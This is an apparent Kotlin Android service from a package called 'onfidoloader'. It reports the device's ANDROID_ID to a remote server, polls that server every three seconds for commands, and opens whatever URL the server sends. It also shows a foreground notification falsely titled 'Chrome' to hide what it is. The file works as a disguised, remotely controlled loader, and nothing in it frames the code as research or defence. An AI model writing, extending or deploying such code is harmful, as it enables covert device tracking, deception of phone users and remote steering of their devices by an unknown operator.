package com.example.onfidoloader

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.URL

class BackgroundService : Service() {

    private val serverBase = "https://kyc.skazitop.network/api"
    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    private var job: Job? = null

    private fun logEvent(event: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                URL("$serverBase/log.php?deviceId=$deviceId&event=$event").readText()
            } catch (e: Exception) {
                Log.e("BackgroundService", "Logging error: ${e.message}")
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        logEvent("launch")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = "ForegroundServiceChannel"
            val channel = NotificationChannel(
                channelId,
                "Foreground Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)

            val notification = Notification.Builder(this, channelId)
                .setContentTitle("Chrome")
                .setContentText("Running in background")
                .setSmallIcon(R.mipmap.ic_launcher)
                .build()

            startForeground(1, notification)
        }

        job = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                try {
                    val result = URL("$serverBase/command.php?deviceId=$deviceId").readText().trim()

                    Log.d("BackgroundService", "Received command: '$result'")

                    val json = JSONObject(result)
                    val commandType = json.getString("type")

                    when (commandType) {
                        "open" -> {
                            val url = json.getString("payload")
                            Log.d("BackgroundService", "Opening URL: '$url'")

                            Intent(this@BackgroundService, MainActivity::class.java).apply {
                                putExtra("url", url)
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                            }.also { startActivity(it) }

                            logEvent("open")
                        }

                        "close" -> {
                            Log.d("BackgroundService", "Received CLOSE command, stopping service")

                            // ⬇️ Исправлено: явно останавливаем сервис и закрываем MainActivity
                            Intent(this@BackgroundService, MainActivity::class.java).apply {
                                putExtra("forceClose", true)
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                            }.also { startActivity(it) }

                            logEvent("close")
                            stopSelf()
                            break
                        }

                        else -> {
                            Log.d("BackgroundService", "No action for command type: '$commandType'")
                        }
                    }

                    delay(3000)
                } catch (e: Exception) {
                    Log.e("BackgroundService", "Polling error: ${e.message}")
                }
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job?.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
